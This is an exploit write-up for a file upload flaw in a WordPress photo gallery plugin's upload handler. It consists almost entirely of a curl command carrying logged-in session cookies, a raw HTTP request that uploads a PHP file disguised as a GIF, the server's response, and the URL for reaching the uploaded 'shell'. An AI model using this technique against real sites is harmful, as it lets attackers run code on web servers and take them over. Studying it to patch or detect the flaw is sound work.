Exploit:


- Login with user (admin, author or user normal) to have session, add cookie into request:

curl -k -X POST -F "files=@./info.php" --cookie "wordpress_5bd7a9c61cda6e66fc921a05bc80ee93=admin%7C1535599925%7CDdeVaeflxeyA27HvosKaBxrDD85psiot1YCRExTqI64%7C792eb6fc40ace932cdeb033f667ef51b845aad1a33c4b3b159e7e9e896c737d3; wp-settings-time-1=1535427125; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_5bd7a9c61cda6e66fc921a05bc80ee93=admin%7C1535599925%7CDdeVaeflxeyA27HvosKaBxrDD85psiot1YCRExTqI64%7Cb396364076490915e13c33925c4a19082e3ce436a4e430c4ac19e6a8e4dcdc31; language=en_US" http://localhost/wordpress/wp-admin/admin-ajax.php?action=bwg_UploadHandler&dir=


Burpsuite Request:

POST /wordpress/wp-admin/admin-ajax.php?action=bwg_UploadHandler&dir= HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1/wordpress/wp-content/plugins/monsters-editor-10-for-wp-super-edit/mse/fckeditor/editor/filemanager/upload/test.html
Cookie: wordpress_5bd7a9c61cda6e66fc921a05bc80ee93=admin%7C1535599925%7CDdeVaeflxeyA27HvosKaBxrDD85psiot1YCRExTqI64%7C792eb6fc40ace932cdeb033f667ef51b845aad1a33c4b3b159e7e9e896c737d3; wp-settings-time-1=1535427125; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_5bd7a9c61cda6e66fc921a05bc80ee93=admin%7C1535599925%7CDdeVaeflxeyA27HvosKaBxrDD85psiot1YCRExTqI64%7Cb396364076490915e13c33925c4a19082e3ce436a4e430c4ac19e6a8e4dcdc31; language=en_US
Connection: close
Content-Type: multipart/form-data; boundary=---------------------------219415299974
Content-Length: 226

-----------------------------219415299974
Content-Disposition: form-data; name="files"; filename="info.php.gif"
Content-Type: application/octet-stream

<?php phpinfo();?>



=> RESPONSE

HTTP/1.1 200 OK
Date: Tue, 28 Aug 2018 03:59:50 GMT
Server: Apache/2.4.17 (Win32) OpenSSL/1.0.2d PHP/5.5.35
X-Powered-By: PHP/5.5.35
X-Robots-Tag: noindex
X-Content-Type-Options: nosniff
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
X-Frame-Options: SAMEORIGIN
Content-Disposition: inline; filename="files.json"
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: false
Access-Control-Allow-Methods: OPTIONS, HEAD, GET, POST, PUT, PATCH, DELETE
Access-Control-Allow-Headers: Content-Type, Content-Range, Content-Disposition
Vary: Accept
Content-Length: 619
Connection: close
Content-Type: text/plain

<br />
<b>Warning</b>:  explode() expects parameter 2 to be string, array given in <b>C:\xampp\htdocs\wordpress\wp-includes\functions.wp-scripts.php</b> on line <b>228</b><br />
<br />
<b>Warning</b>:  mkdir(): Invalid path in <b>C:\xampp\htdocs\wordpress\wp-content\plugins\photo-gallery\filemanager\UploadHandler.php</b> on line <b>694</b><br />
{"files":[{"name":"info.php (1).gif","size":21,"type":"application\/octet-stream","url":"http:\/\/127.0.0.1\/wordpress\/wp-admin\/files\/info.php%20%281%29.gif","delete_url":"http:\/\/127.0.0.1\/wordpress\/wp-admin\/?file=info.php%20%281%29.gif","delete_type":"DELETE"}]}


Access shell at url:

http://127.0.0.1/wordpress/wp-admin/info.php.gif